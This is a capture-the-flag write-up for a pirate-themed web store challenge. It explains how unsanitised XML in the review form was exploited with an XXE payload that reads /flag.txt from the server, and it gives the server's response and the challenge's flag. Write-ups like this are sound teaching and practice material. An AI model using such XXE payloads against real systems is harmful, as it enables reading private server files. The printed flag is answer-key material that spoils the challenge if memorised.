---
author: OpenCode
credit: OpenCode, Tyler
---

## Analysis

The Quartermaster Store is a pirate-themed e-commerce web application. After registering an account and logging in, users can:
- Browse and purchase pirate-themed products
- Submit reviews for products
- Play a "plunder" minigame to earn doubloons

The challenge is worth 500 points, indicating a moderately difficult vulnerability.

## Approach

### Step 1: Explore the Application

After registering and logging in, I discovered several endpoints:
- `/` - Product catalog with buy functionality
- `/review` - Product review submission form
- `/plunder` - A minigame

### Step 2: Identify the Vulnerability

Examining the review form's JavaScript (`/static/review.js`), I found it submits XML data directly to the server:

```javascript
const xmlPayload = `<?xml version="1.0"?>
<review>
    <product>${productName}</product>
    <rating>${rating.value}</rating>
    <comment>${reviewContent}</comment>
</review>`;

fetch('/review', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/xml'
    },
    body: xmlPayload
})
```

The user input is directly inserted into the XML payload without sanitization, making it vulnerable to **XML External Entity (XXE) Injection**.

### Step 3: Exploit XXE to Read Local Files

I crafted an XXE payload to read the flag from the server's filesystem:

```xml
<?xml version="1.0"?>
<!DOCTYPE review [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<review>
    <product>&xxe;</product>
    <rating>5</rating>
    <comment>test</comment>
</review>
```

This payload defines an external entity `xxe` that references the file `/flag.txt`. When the server processes the XML, it expands `&xxe;` with the contents of that file, which is returned in the response message.

### Step 4: Retrieve the Flag

The server responded with:

```
Ye didn't buy any BCCTF{N0_H0nor_AmonG_Th3vEs} here matey!
```

## Flag

`BCCTF{N0_H0nor_AmonG_Th3vEs}`
